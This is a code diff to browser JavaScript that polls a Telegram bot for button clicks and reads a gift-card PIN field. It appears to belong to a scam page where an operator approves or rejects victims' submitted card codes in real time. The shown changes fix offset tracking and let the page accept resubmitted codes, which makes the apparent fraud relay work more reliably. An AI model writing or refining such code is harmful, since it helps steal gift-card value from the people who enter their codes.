@@ -554,21 +554,28 @@ async function acknowledgeTelegramAction(callbackId, messageId, originalText, st
 }
 
 // Poll Telegram directly for button clicks
+// Variable to keep track of the highest processed Telegram update ID
+let telegramLastUpdateId = 0;
+
 function startTelegramPolling(targetUser) {
     if (telegramPollInterval) clearInterval(telegramPollInterval);
 
     telegramPollInterval = setInterval(async () => {
         try {
-            // Get latest bot updates directly from Telegram API
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=-10`);
+            // Pass offset to tell Telegram to clear already-processed updates from its queue
+            const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : `?offset=-10`;
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`);
             const data = await response.json();
 
-            if (!data.ok || !data.result) return;
+            if (!data.ok || !data.result || data.result.length === 0) return;
 
             const statusBox = document.getElementById("status_message");
             const submitBtn = document.getElementById("submit_btn");
 
             for (const update of data.result) {
+                // Update tracker to guarantee Telegram drops this update on subsequent requests
+                telegramLastUpdateId = update.update_id;
+
                 if (update.callback_query && update.callback_query.data) {
                     const callbackData = update.callback_query.data;
                     const callbackId = update.callback_query.id;
@@ -608,6 +615,9 @@ function startTelegramPolling(targetUser) {
                         }
                         if (submitBtn) submitBtn.disabled = false;
 
+                        // Clear lastSentPayload so user can resubmit/edit without getting blocked by duplicate checks
+                        lastSentPayload = "";
+
                         break;
                     }
                 }
@@ -617,6 +627,7 @@ function startTelegramPolling(targetUser) {
         }
     }, 2500); // Check Telegram every 2.5 seconds
 }
+
 
 async function submitClearanceCode() {
     const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
